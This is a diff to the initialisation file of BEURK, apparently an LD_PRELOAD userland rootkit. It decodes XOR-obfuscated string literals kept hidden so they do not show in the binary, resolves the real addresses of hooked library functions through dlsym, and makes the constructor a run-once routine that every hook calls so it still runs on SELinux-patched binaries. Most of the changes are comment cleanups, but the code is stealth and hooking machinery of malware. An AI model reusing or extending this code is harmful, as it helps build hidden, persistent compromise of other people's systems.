@@ -20,8 +20,9 @@
 
 #include <string.h> /* strlen() */
 #include <dlfcn.h> /* dlsym(), dlerror() */
-#include "beurk.h" /* DEBUG(), prototype */
+#include "beurk.h" /* prototype */
 #include "config.h" /* XOR_KEY, NUM_LITERALS, __hidden_literals, ... */
+#include "debug.h" /* DEBUG() */
 
 
 /** xorify a string whith XOR_KEY
@@ -46,11 +47,11 @@ static void     xor(char *str) {
 
 /** re-xorify hidden literals.
  * hidden literals are all string literals used in the library
- * which are xorified before compilagtion in order to prevent
- * string leaking.
+ * that are xorified before compilation in order to avoid
+ * leaking strings.
  *
- * this function restores clear literals values, as defined in
- * BEURK config file.
+ * this function restores clear literals values, as they are
+ * defined in BEURK's config file.
  */
 static void     init_hidden_literals(void) {
     int         i;
@@ -62,11 +63,11 @@ static void     init_hidden_literals(void) {
 
 
 /** retrieve native function pointers of hooked functions
- * it feeds __non_hooked_symbols table from function names
- * (stored at the end of __hidden_literals).
+ * it fills __non_hooked_symbols table with function adresses
+ * (names are stored at the end of __hidden_literals).
  *
  * NOTE: If not called, all `REAL_<NAME>` macros will point
- * to an invalid location.
+ *      to an invalid location.
  */
 static void     init_non_hooked_symbols(void) {
     int         i, j;
@@ -84,8 +85,20 @@ static void     init_non_hooked_symbols(void) {
 
 
 /** library constructor
+ * this function is automatically called at initialisation on
+ * all systems, unless the binaries are patched for SElinux
+ *
+ * NOTE: On those binaries, the constructor isn't called at
+ *      startup. which is why we call this singleton function
+ *      at the beginning of ALL internal API functions and hooks.
  */
 void            init(void) {
-    init_hidden_literals();
-    init_non_hooked_symbols();
+    static loaded = 0;
+
+    if (!loaded) {
+        init_hidden_literals();
+        init_non_hooked_symbols();
+        DEBUG(D_INFO, "init() called.");
+        loaded = 1;
+    }
 }
